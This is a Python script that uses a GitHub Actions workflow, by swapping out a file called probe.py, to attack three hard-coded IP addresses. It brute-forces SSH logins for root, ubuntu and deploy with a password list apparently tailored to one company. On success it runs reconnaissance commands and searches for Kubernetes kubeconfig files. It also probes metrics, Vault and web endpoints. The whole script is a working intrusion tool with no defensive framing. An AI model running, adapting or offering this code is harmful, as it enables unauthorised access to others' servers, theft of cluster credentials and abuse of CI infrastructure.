#!/usr/bin/env python3
# ct49 i226317 : SSH auth-surface + .148 high-port probe from GitHub Actions (Azure) egress.
# Replaces probe.py only to trigger the existing ct49-egress-portmap workflow; output goes to the job log.
import subprocess, shlex, sys

HOSTS = ["129.212.142.60", "129.212.194.148", "142.93.160.150"]
USERS = ["root", "ubuntu", "deploy"]
PWS = ["Password1#", "Computer7,", "Tonic2024!", "Me@Cardtonic.com25", "M3@Admin",
       "Cardtonic@2025", "Cardtonic@2024", "1234567890", "Kpegetom1713",
       "Admin@123", "Ubuntu@2024", "P@ssw0rd"]


def run(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t, text=True)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "EXC " + repr(e)


def say(x):
    print(x, flush=True)


say("EGRESS ipify=%s" % run("curl -s --max-time 12 https://api.ipify.org", 20).strip())
say("EGRESS ifconfig=%s" % run("curl -s --max-time 12 https://ifconfig.me", 20).strip())
if not run("command -v sshpass").strip():
    say("sshpass-install: " + run("sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq sshpass 2>&1 | tail -2", 240).strip())

for h in HOSTS:
    say("##### %s" % h)
    say("banner: " + run("timeout 12 bash -c 'exec 3<>/dev/tcp/%s/22; head -c 80 <&3' 2>&1 | head -c 120" % h, 20).strip())
    for u in USERS:
        out = run("timeout 24 ssh -o BatchMode=yes -o PreferredAuthentications=none -o ConnectTimeout=8 "
                  "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s@%s 2>&1 | grep -v 'Permanently added' | tail -2" % (u, h), 35)
        say("--- %s@%s :: %s" % (u, h, out.strip().replace("\n", " | ")))
        if "password" in out:
            for pw in PWS:
                r = run("timeout 30 sshpass -p %s ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password "
                        "-o NumberOfPasswordPrompts=1 -o ConnectTimeout=8 -o StrictHostKeyChecking=no "
                        "-o UserKnownHostsFile=/dev/null %s@%s 'id; hostname; uname -a; ip -4 addr | grep inet; "
                        "ss -lntp 2>/dev/null | head -30; head -3 /etc/os-release' 2>&1 | tail -40"
                        % (shlex.quote(pw), u, h), 45)
                ok = ("uid=" in r)
                say("    pw[%s] %s :: %s" % (pw, "HIT" if ok else "no", r.strip().replace("\n", " | ")[:600]))
                if ok:
                    say(run("sshpass -p %s ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                            "%s@%s 'ls -l /etc/kubernetes/*.conf /var/lib/kubelet/kubeconfig /etc/rancher/*/*.yaml 2>/dev/null; "
                            "command -v kubectl; hostname' 2>&1 | tail -20" % (shlex.quote(pw), u, h), 45))
                    break

for u in ["http://129.212.194.148:9100/metrics", "https://129.212.194.148:8200/v1/sys/health",
          "http://129.212.194.148:3000/", "http://129.212.142.60:9100/metrics"]:
    say("##### %s" % u)
    say(run("timeout 18 curl -sk --max-time 14 -o /tmp/o -w 'http=%%{http_code} size=%%{size_download} t=%%{time_total}\\n' "
            "%s; echo '--body--'; head -c 240 /tmp/o 2>/dev/null | tr '\\n' ' '; echo; "
            "grep -m2 -E 'node_uname_info|\"initialized\"' /tmp/o 2>/dev/null | cut -c1-200" % u, 25).strip())
